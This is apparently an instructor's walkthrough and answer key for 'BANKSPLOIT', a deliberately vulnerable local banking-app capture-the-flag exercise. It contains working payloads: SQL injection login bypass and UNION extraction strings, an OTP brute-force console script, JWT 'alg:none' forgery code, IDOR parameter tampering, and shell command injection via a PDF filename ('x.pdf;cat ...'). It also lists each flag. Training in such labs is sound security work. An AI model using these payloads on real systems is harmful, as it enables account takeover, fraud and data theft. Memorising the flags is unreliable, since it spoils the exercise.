L11 OTP Leaked in JavaScript File
100 pts CWE-209 Information Disclosure

Vulnerability Description

When the OTP verification page loads, it includes a JavaScript file (/public/js/otp-validation.js) that contains the actual OTP value AND the flag embedded in a SESSION_DATA object. This file is dynamically served per-session — the server injects the real OTP into it. An attacker who inspects loaded scripts in DevTools will find both the OTP and the flag immediately.

Exploitation Steps

1 Log in with valid credentials to reach the OTP page

Navigate to http://localhost:9443/login. Enter BS100234 / password123 and click Sign In. The OTP verification page appears.

2 Open DevTools and inspect loaded JavaScript files

Press F12 → go to the Sources tab (or Network tab → filter by JS). Look for otp-validation.js. Click it to view its contents.

3 Find the OTP and flag in SESSION_DATA

Inside the JS file, search for SESSION_DATA. You'll find:

var SESSION_DATA = {"_t":"otp","_v":"2.1.4","_otp":"4823","_flag":"BANKSPLOIT{14AEF693F583}","_sid":"abc123...","_exp":1720000000};

The _otp field contains the OTP (use it to complete login). The _flag field contains the L11 flag.

💡 Alternative discovery: In the Network tab, click on the otp-validation.js request → Response sub-tab. Same content is visible there. The key insight is that JavaScript files loaded by a page can contain sensitive server-side data.
🚩 BANKSPLOIT{14AEF693F583} ✓ Found in JS file SESSION_DATA._flag
G1 SQL Injection — Login Bypass
200 pts CWE-89 Authentication Bypass

Vulnerability Description

The login form inserts the Customer ID directly into an SQL query without sanitization. By appending ' -- (a SQL comment), you can terminate the query after the username match and skip the password check entirely. You must target a known, valid username — blind tautologies like ' OR '1'='1 are blocked.

Exploitation Steps

1 Open DevTools Network tab

Press F12 → Network tab (capture the POST response).

2 Enter the SQL injection payload

On the login page, type in the Customer ID field:

BS100234' --

Important: There must be a space after --. The Password field can be anything (e.g. x).

3 Click Sign In — the login succeeds without the real password

The SQL becomes: WHERE customer_id = 'BS100234' -- ' AND password_md5 = '...'
Everything after -- is a comment. The password check is removed. You reach the OTP page.

4 Find the flag in the Network tab response headers

In the Network tab, click the POST request to /login. Go to Headers → Response Headers. You'll see:

X-CTF-Flag: BANKSPLOIT{B1AC0270D59E}

The server detected SQL metacharacters in the Customer ID that resulted in a successful login — proof of injection.

⚠️ Why ' OR '1'='1 doesn't work: The server validates that the returned row's customer_id appears in your input. Tautologies return a random user whose ID isn't in your payload — so they're rejected. You MUST target a specific real username like BS100234.
🚩 BANKSPLOIT{B1AC0270D59E} ✓ X-CTF-Flag response header
L10 OTP Brute-Force (No Rate Limiting)
200 pts CWE-307 Broken Authentication

Vulnerability Description

The OTP verification endpoint has no rate limiting or lockout. The OTP is 4 digits (0000–9999), so an attacker can try all 10,000 combinations from the browser Console. The flag is returned in the response body when the correct OTP is submitted.

How brute-force is guaranteed

The OTP is a random 4-digit code generated server-side. It is NOT visible anywhere on the page, in the HTML source, or in any response body (the L11 JS leak is a separate vuln). The ONLY way to get the correct OTP at this challenge level is to try all possibilities — hence brute-force.

Exploitation Steps

1 Log in to reach the OTP page

Go to http://localhost:9443/login, enter BS100234 / password123, click Sign In. The OTP page appears.

2 Open Console and run the brute-force script

Press F12 → Console. Paste and run:

// Brute-force the 4-digit OTP via the login form endpoint
(async () => {
  for (let i = 0; i <= 9999; i++) {
    const otp = String(i).padStart(4, '0');
    const r = await fetch('/login', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'application/json'
      },
      body: 'otp=' + otp
    });
    if (r.headers.get('content-type')?.includes('json')) {
      const d = await r.json();
      if (d.ok) {
        console.log('✅ OTP found:', otp);
        console.log('🚩 Flag:', d.ctf_flag);
        break;
      }
    }
    if (i % 1000 === 0) console.log(`Tried ${i}/9999...`);
  }
})();
3 Flag appears when the correct OTP is found

The script iterates until the correct OTP is hit. Output:

Tried 0/9999...
Tried 1000/9999...
Tried 4000/9999...
✅ OTP found: 4823
🚩 Flag: BANKSPLOIT{AB0ADD19226E}
💡 Why this works: The fetch() runs in the same browser session (cookies auto-included). We send Accept: application/json so the server returns a JSON response with the flag instead of redirecting. No rate limiting means all 10,000 codes can be tried without lockout.
⚠️ Alternative (JSON API): You can also brute-force via /api/v1/auth/verify-otp: 
// Alternative: use the JSON API endpoint
const r = await fetch('/api/v1/auth/verify-otp', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({otp: '1234'})
});
const d = await r.json();
// On success: d.ctf_flag contains the L10 flag
🚩 BANKSPLOIT{AB0ADD19226E} ✓ In JSON response body on correct OTP
SL1 IDOR — View Other Users' Statements
200 pts CWE-639 Insecure Direct Object Reference

Vulnerability Description

The Statements page uses a ?account= URL parameter containing the account number. The server resolves this to an account record without checking if the logged-in user owns it. By discovering another user's account number (from the Beneficiaries page) and putting it in the URL, you can view their transactions.

Exploitation Steps

1 Discover another user's account number from Beneficiaries

After logging in, navigate to Transfer → look at the Beneficiary dropdown. It lists other users with their account numbers (e.g., Priya Patel · 50100100000002 · HDFC0001234). Note down an account number that isn't yours.

2 Open DevTools Network tab

Press F12 → Network tab.

3 Navigate to Statements with the other user's account number

In the browser address bar, go to:

http://localhost:9443/statements?account=50100100000002

The page loads Priya's transactions — you can see her statement data even though you're logged in as Rahul.

4 Capture the flag from the response header

In the Network tab, click the request to /statements?account=50100100000002. Check Response Headers:

X-CTF-Flag: BANKSPLOIT{8A3F12D4E7B9}

The server detected that you accessed an account belonging to a different user — confirmed IDOR.

💡 Discovery path: Account numbers are discoverable from the Beneficiaries shown in the Transfer page dropdown. These are pre-seeded references to other users' real accounts — exactly how a real bank exposes IDOR vectors.
🚩 BANKSPLOIT{...} ✓ X-CTF-Flag header on statements page
L1 IDOR — Transfer from Other Account
300 pts CWE-639 Insecure Direct Object Reference

Vulnerability Description

The Transfer page shows a "From account" dropdown that is disabled (greyed out), with a hidden <input> submitting your own account ID. The server does NOT verify ownership of the from_account_id on the backend. By editing the hidden field to another user's account ID and completing the full transfer wizard, money is moved from their account.

Exploitation Steps

1 Navigate to the Transfer page

After logging in, click Transfer. Notice the "From account" is greyed out (disabled) — you can't change it by clicking.

2 Inspect the form and find the hidden input

Press F12 → Elements tab. Find the Transfer form. Look for:

<select disabled class="...">...</select>
<input type="hidden" name="from_account_id" value="1">

The hidden input with value="1" is what actually gets submitted. The disabled select is cosmetic.

3 Change the hidden input value to another user's account ID

Double-click the value="1" in the Elements tab and change it to 4 (another user's account). You can discover valid account IDs from the Beneficiaries or by trying sequential numbers.

4 Complete the full transfer wizard

Select a beneficiary, enter an amount (₹1), click Continue → Confirm & send OTP → enter the transfer OTP (brute-force it the same way as L10 if needed, or get it from the transfer OTP generator) → Authorise transfer.

5 Capture the flag from the receipt response

In the Network tab, the final POST (the "verify" action) that shows the receipt has:

X-CTF-Flag: BANKSPLOIT{010B2A077ED2}

The server detected that from_account_id=4 doesn't belong to you — IDOR confirmed.

💡 Key insight: The disabled dropdown is a client-side restriction only. The server trusts the hidden input value without verifying ownership. This is a classic example of "client-side enforcement with no server-side validation."
🚩 BANKSPLOIT{010B2A077ED2} ✓ X-CTF-Flag header on transfer receipt
L12 JWT Algorithm None — Privilege Escalation
300 pts CWE-347 Broken Access Control

Vulnerability Description

After login, the app sets an access_token cookie containing a JWT. The server accepts "alg": "none" — meaning the token's signature is never verified. You can forge a JWT with "role": "admin" and access the secret Vault endpoint that only responds to admin-level tokens.

Exploitation Steps

1 Log in and find your JWT cookie

Complete a full login. Open F12 → Application tab → Cookies → your site. Find access_token.

2 Decode it in the Console 
// Decode your JWT
const jwt = document.cookie.match(/access_token=([^;]+)/)[1];
const [h, p] = jwt.split('.');
console.log('Header:', JSON.parse(atob(h)));
console.log('Payload:', JSON.parse(atob(p)));

You'll see alg: "none" and role: "user".

3 Forge an admin JWT 
// Forge a JWT with role:admin and alg:none (no signature needed)
const hdr = btoa(JSON.stringify({alg:"none",typ:"JWT"})).replace(/=/g, '');
const pay = btoa(JSON.stringify({
  sub: "BS100234",
  role: "admin",
  iat: 1700000000,
  exp: 1900000000
})).replace(/=/g, '');
const forged = hdr + '.' + pay + '.';
console.log('Forged:', forged);
4 Access the admin-only Vault 
// Fetch the vault with the forged admin JWT
const r = await fetch('/api/v1/auth/vault', {
  headers: {'Authorization': 'Bearer ' + forged}
});
const data = await r.json();
console.log(data);

Output:

{
  "ok": true,
  "message": "🔓 Vault unlocked! You forged a valid admin JWT.",
  "flag": "BANKSPLOIT{AF9F3DBEC256}",
  "user": "BS100234"
}
💡 Why fetch() is needed: The vault checks Authorization: Bearer — you can't navigate there in the address bar. Console fetch() is the browser-native way to set custom headers.
🚩 BANKSPLOIT{AF9F3DBEC256} ✓ In JSON response from /api/v1/auth/vault
G2 SQL Injection — UNION Data Extraction
300 pts CWE-89 Data Exfiltration

Vulnerability Description

The Statements page date filter is vulnerable to SQL injection. Unlike G1 (bypass), this allows UNION-based injection to extract data from other database tables — including a ctf_flags table containing the G2 flag in hex-encoded form.

Exploitation Steps

1 Navigate to Statements and change the date input type

Go to Statements. Right-click the "To" date field → Inspect. In Elements, change type="date" to type="text". Press Enter.

2 Enter the UNION injection payload

In the now-editable "To" field, type:

2099-01-01' UNION SELECT NULL,HEX(flag),NULL,NULL,NULL,NULL,NULL FROM ctf_flags WHERE user_id=1 --

Click Apply Filters.

3 Read the hex from the transaction table

A new row appears. The Description column shows a hex string like 42414E4B53504C4F49547B.... Copy it.

4 Decode the hex in the Console 
// Decode the hex string
const hex = '42414E4B53504C4F49547B3034313438373146363642387D';
const flag = hex.match(/.{2}/g).map(h => String.fromCharCode(parseInt(h, 16))).join('');
console.log(flag);

Output: BANKSPLOIT{0414871F66B8}

⚠️ Why HEX() and position 2? Without HEX(), MySQL may throw a collation mismatch. Position 2 = Description column (position 1 is Date, which truncates to 10 chars).
🚩 BANKSPLOIT{0414871F66B8} ✓ Extracted via UNION SELECT from ctf_flags table
G9 Command Injection — PDF Export
300 pts CWE-78 Remote Code Execution

Vulnerability Description

The "Download PDF" feature passes the filename parameter into a shell command without sanitization. Injecting a semicolon (;) allows running arbitrary commands — including listing files and reading a hidden flag file planted on the server.

Exploitation Steps

1 Find the PDF export on the Statements page

Navigate to Statements. Look for the "PDF file name" input field (default: statement.pdf) and "Download PDF" button.

2 Inject a command to discover files

Change the filename to:

x.pdf;ls;

Click Download PDF. The browser shows JSON output with a file listing. Look for flag_g9_1.txt.

3 Read the flag file

Go back, change the filename to:

x.pdf;cat flag_g9_1.txt;

Click Download PDF.

4 Flag is in the command output 
{
  "ok": true,
  "output": "Generated PDF: .../x.pdf\nBANKSPLOIT{4F2CFE06F9DF}\n"
}
💡 Two-step approach: First ls to discover file names (you don't know what they're called), then cat to read. This mirrors real-world RCE exploitation: enumerate → extract.
🚩 BANKSPLOIT{4F2CFE06F9DF} ✓ Read from flag file via command injection

📝 Notes for Instructors

Flag Uniqueness

Flags are unique per participant — computed as HMAC-SHA256(user_id + ":" + vuln_key, FLAG_SECRET). The flags shown in this walkthrough are specific to user_id=1. Each participant gets different values — sharing flags won't work.

OTP Delivery (SMS Inbox)

Participants can get the OTP legitimately via the "📱 Open SMS Inbox" button on the OTP page, which opens /otp-inbox. This page shows the OTP but does NOT reveal the L11 flag. The L11 flag is only discoverable by inspecting the JavaScript file — the SMS Inbox is the "phone" delivery channel, not the vulnerability.

No CSRF Tokens

CSRF protection is disabled for the CTF. Forms submit without any token — this simplifies exploitation scripts and removes irrelevant friction.

JWT Read-Only

Forged JWT tokens can access read-only pages (dashboard, statements, cards list) but cannot perform write operations (transfers, payments, profile updates). Write endpoints return HTTP 403: "Session authentication required. JWT tokens are read-only." The L12 vault challenge works because it's a GET endpoint.
